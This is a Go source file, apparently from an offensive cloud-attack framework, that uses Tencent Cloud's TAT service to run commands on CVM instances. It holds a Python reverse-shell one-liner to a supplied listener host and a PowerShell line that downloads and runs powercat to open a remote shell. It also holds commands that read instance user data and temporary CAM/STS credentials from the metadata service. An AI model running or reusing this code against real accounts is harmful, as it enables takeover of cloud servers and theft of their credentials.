package tencentcvm

import (
	"encoding/base64"
	"fmt"
	"github.com/AlecAivazis/survey/v2"
	"github.com/gookit/color"
	log "github.com/sirupsen/logrus"
	"github.com/teamssix/cf/pkg/util"
	"github.com/teamssix/cf/pkg/util/cmdutil"
	"github.com/tencentcloud/tencentcloud-sdk-go/tencentcloud/common"
	tat "github.com/tencentcloud/tencentcloud-sdk-go/tencentcloud/tat/v20201028"
	"io/ioutil"
	"os"
	"strconv"
	"strings"
	"time"
)

var timeSleepSum int

var linuxSet = []string{"CentOS", "Ubuntu", "Debian", "OpenSUSE", "SUSE", "CoreOS", "FreeBSD", "Kylin", "UnionTech", "TencentOS", "Other Linux"}

//var winSet = []string{"Windows Server 2008", "Windows Server 2012", "Windows Server 2016"}

func find(slice []string, val string) bool {
	for _, item := range slice {
		if item == val {
			return true
		}
	}
	return false
}

func CreateCommand(region string, OSType string, command string, scriptType string) string {
	request := tat.NewCreateCommandRequest()
	request.SetScheme("https")
	cmdName := strconv.FormatInt(time.Now().Unix(), 10)
	request.CommandName = &cmdName
	if scriptType == "auto" {
		if OSType == "linux" {
			request.CommandType = common.StringPtr("SHELL")
		} else {
			request.CommandType = common.StringPtr("POWERSHELL")
		}
	} else if scriptType == "sh" {
		request.CommandType = common.StringPtr("SHELL")
	} else if scriptType == "ps" {
		request.CommandType = common.StringPtr("POWERSHELL")
	}
	log.Debugln("执行命令 (Execute command): \n" + command)
	request.Content = common.StringPtr(base64.StdEncoding.EncodeToString([]byte(command)))
	respone, err := TATClient(region).CreateCommand(request)
	util.HandleErr(err)
	CommandId := *respone.Response.CommandId
	log.Debugln("得到 CommandId 为 (CommandId value): " + CommandId)
	return CommandId
}

func DeleteCommand(region string, CommandId string) {
	request := tat.NewDeleteCommandRequest()
	request.SetScheme("https")
	request.CommandId = common.StringPtr(CommandId)
	_, err := TATClient(region).DeleteCommand(request)
	util.HandleErr(err)
	log.Debugln("删除 CommandId (Delete CommandId): " + CommandId)
}

func InvokeCommand(region string, OSType string, command string, scriptType string, specifiedInstanceID string) (string, string) {
	CommandId := CreateCommand(region, OSType, command, scriptType)
	request := tat.NewInvokeCommandRequest()
	request.SetScheme("https")
	request.CommandId = &CommandId
	request.InstanceIds = common.StringPtrs([]string{specifiedInstanceID})
	response, err := TATClient(region).InvokeCommand(request)
	util.HandleErr(err)
	InvokeId := *response.Response.InvocationId
	log.Debugln("得到 InvokeId 为 (InvokeId value): " + InvokeId)
	return CommandId, InvokeId
}

func DescribeInvocationResults(region string, CommandId string, InvokeId string, timeOut int) string {
	var output string
	timeSleep := 2
	timeSleepSum = timeSleepSum + timeSleep
	time.Sleep(time.Duration(timeSleep) * time.Second)
	request := tat.NewDescribeInvocationTasksRequest()
	request.SetScheme("https")
	request.HideOutput = common.BoolPtr(false)
	response, err := TATClient(region).DescribeInvocationTasks(request)
	util.HandleErr(err)
	InvokeRecordStatus := response.Response.InvocationTaskSet[0].TaskStatus
	CommandId = *response.Response.InvocationTaskSet[0].CommandId
	if *InvokeRecordStatus == "SUCCESS" {
		output = *response.Response.InvocationTaskSet[0].TaskResult.Output
		log.Debugln("命令执行结果 base64 编码值为 (The base64 encoded value of the command execution result is):\n" + output)
		DeleteCommand(region, CommandId)
	} else {
		if timeSleepSum > timeOut {
			log.Warnf("命令执行超时，如果想再次执行可以使用 -t 或 --timeOut 参数指定命令等待时间 (If you want to execute the command again, you can use the -t or --timeOut parameter to specify the waiting time)")
			os.Exit(0)
		} else {
			log.Debugf("命令执行结果为 %s，等待 %d 秒钟后再试 (Command execution result is %s, wait for %d seconds and try again)", InvokeRecordStatus, timeSleep, InvokeRecordStatus, timeSleep)
			output = DescribeInvocationResults(region, CommandId, InvokeId, timeOut)
		}
	}
	return output
}

func CVMExec(command string, commandFile string, scriptType string, specifiedInstanceID string, region string, batchCommand bool, userData bool, metaDataSTSToken bool, cvmFlushCache bool, lhost string, lport string, timeOut int) {
	var InstancesList []Instances
	if cvmFlushCache == false {
		data := cmdutil.ReadCacheFile(CVMCacheFilePath, "tencent")
		for _, i := range data {
			if specifiedInstanceID != "all" {
				if specifiedInstanceID == i[1] {
					obj := Instances{
						InstanceId:       i[1],
						OSName:           i[2],
						InstanceType:     i[3],
						InstanceState:    i[4],
						PrivateIpAddress: i[5],
						PublicIpAddress:  i[6],
						Zone:             i[7],
					}
					InstancesList = append(InstancesList, obj)
				}
			} else {
				obj := Instances{
					InstanceId:       i[1],
					OSName:           i[2],
					InstanceType:     i[3],
					InstanceState:    i[4],
					PrivateIpAddress: i[5],
					PublicIpAddress:  i[6],
					Zone:             i[7],
				}
				InstancesList = append(InstancesList, obj)
			}
		}
	} else {
		InstancesList = ReturnInstancesList(region, false, specifiedInstanceID)
	}
	if len(InstancesList) == 0 {
		if specifiedInstanceID == "all" {
			log.Warnf("未发现实例，可以使用 --flushCache 刷新缓存后再试 (No instances found, You can use the --flushCache command to flush the cache and try again)")
		} else {
			log.Warnf("未找到 %s 实例的相关信息 (No information found about the %s instance)", specifiedInstanceID, specifiedInstanceID)
		}
	} else {
		if specifiedInstanceID == "all" {
			var (
				selectInstanceIDList []string
				selectInstanceID     string
			)
			selectInstanceIDList = append(selectInstanceIDList, "全部实例 (all instances)")
			for _, i := range InstancesList {
				selectInstanceIDList = append(selectInstanceIDList, fmt.Sprintf("%s (%s)", i.InstanceId, i.OSName))
			}
			prompt := &survey.Select{
				Message: "选择一个实例 (Choose a instance): ",
				Options: selectInstanceIDList,
			}
			survey.AskOne(prompt, &selectInstanceID)
			for _, j := range InstancesList {
				if selectInstanceID != "all" {
					if selectInstanceID == fmt.Sprintf("%s (%s)", j.InstanceId, j.OSName) {
						InstancesList = nil
						InstancesList = append(InstancesList, j)
					}
				}
			}
		}
		for _, i := range InstancesList {
			regions := strings.Split(i.Zone, "-")
			region = regions[0] + "-" + regions[1]
			var OSType string
			newOSname := strings.Split(i.OSName, " ")[0]
			if find(linuxSet, newOSname) {
				OSType = "linux"
			}
			specifiedInstanceID := i.InstanceId
			if userData == true {
				commandResult := getUserData(region, OSType, scriptType, specifiedInstanceID, timeOut)
				if commandResult == "" {
					fmt.Println("未找到用户数据 (User data not found)")
				} else if commandResult == "disabled" {
					fmt.Println("该实例禁止访问用户数据 (This instance disables access to user data)")
				} else {
					fmt.Println(commandResult)
				}
			} else if metaDataSTSToken == true {
				commandResult := getMetaDataSTSToken(region, OSType, scriptType, specifiedInstanceID, timeOut)
				if commandResult == "" {
					fmt.Println("未找到临时访问凭证 (STS Token not found)")
				} else if commandResult == "disabled" {
					fmt.Println("该实例禁止访问临时凭证 (This instance disables access to STS Token)")
				} else {
					fmt.Println(commandResult)
				}
			} else {
				if batchCommand == true {
					if OSType == "linux" {
						command = "whoami && id && hostname && ifconfig"
					} else {
						command = "whoami && hostname && ipconfig"
					}
				} else if lhost != "" {
					if OSType == "linux" {
						command = fmt.Sprintf("export RHOST=\"%s\";export RPORT=%s;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"bash\")'", lhost, lport)
					} else {
						command = fmt.Sprintf("powershell IEX (New-Object System.Net.Webclient).DownloadString('https://ghproxy.com/raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');powercat -c %s -p %s -e cmd", lhost, lport)
					}
				} else if commandFile != "" {
					file, err := os.Open(commandFile)
					util.HandleErr(err)
					defer file.Close()
					contentByte, err := ioutil.ReadAll(file)
					util.HandleErr(err)
					content := string(contentByte)
					command = content[:len(content)-1]
				}
				color.Printf("\n<lightGreen>%s ></> %s\n\n", specifiedInstanceID, command)
				commandResult := getExecResult(region, command, OSType, scriptType, specifiedInstanceID, timeOut)
				fmt.Println(commandResult)
			}
		}
	}
}

func getExecResult(region string, command string, OSType string, scriptType string, specifiedInstanceID string, timeOut int) string {
	CommandId, InvokeId := InvokeCommand(region, OSType, command, scriptType, specifiedInstanceID)
	output := DescribeInvocationResults(region, CommandId, InvokeId, timeOut)
	var commandResult string
	if output == "DQo=" {
		commandResult = ""
	} else {
		commandResultByte, err := base64.StdEncoding.DecodeString(output)
		util.HandleErr(err)
		commandResult = string(commandResultByte)
	}
	return commandResult
}

func getUserData(region string, OSType string, scriptType string, specifiedInstanceID string, timeOut int) string {
	var command string
	if OSType == "linux" {
		command = "curl -s http://metadata.tencentyun.com/latest/meta-data/"
	} else {
		command = "Invoke-RestMethod http://metadata.tencentyun.com/latest/meta-data/"
		scriptType = "ps"
	}
	commandResult := getExecResult(region, command, OSType, scriptType, specifiedInstanceID, timeOut)
	if strings.Contains(commandResult, "403 - Forbidden") {
		log.Debugln("元数据访问模式可能被设置成了加固模式，尝试获取 Token 访问 (The metadata access mode may have been set to hardened mode and is trying to get Token access)")
		if OSType == "linux" {
			command = "curl http://metadata.tencentyun.com/latest/meta-data/"
		} else {
			command = "Invoke-RestMethod -Method GET -Uri http://metadata.tencentyun.com/latest/meta-data/"
			scriptType = "ps"
		}
		commandResult = getExecResult(region, command, OSType, scriptType, specifiedInstanceID, timeOut)
		if strings.Contains(commandResult, "404 - Not Found") || strings.Contains(commandResult, "403 - Forbidden") {
			color.Printf("\n<lightGreen>%s ></> %s\n\n", specifiedInstanceID, command)
			commandResult = "disabled"
		}
	} else if strings.Contains(commandResult, "404 - Not Found") {
		color.Printf("\n<lightGreen>%s ></> %s\n\n", specifiedInstanceID, command)
		commandResult = ""
	} else {
		color.Printf("\n<lightGreen>%s ></> %s\n\n", specifiedInstanceID, command)
	}
	return commandResult
}

func getMetaDataSTSToken(region string, OSType string, scriptType string, specifiedInstanceID string, timeOut int) string {
	var command string
	var commandResult string
	if OSType == "linux" {
		command = "curl -s http://metadata.tencentyun.com/latest/meta-data/cam/security-credentials/CVMas"
	} else {
		command = "Invoke-RestMethod http://metadata.tencentyun.com/latest/meta-data/cam/security-credentials/CVMas"
		scriptType = "ps"
	}
	commandResult = getExecResult(region, command, OSType, scriptType, specifiedInstanceID, timeOut)
	return commandResult
}
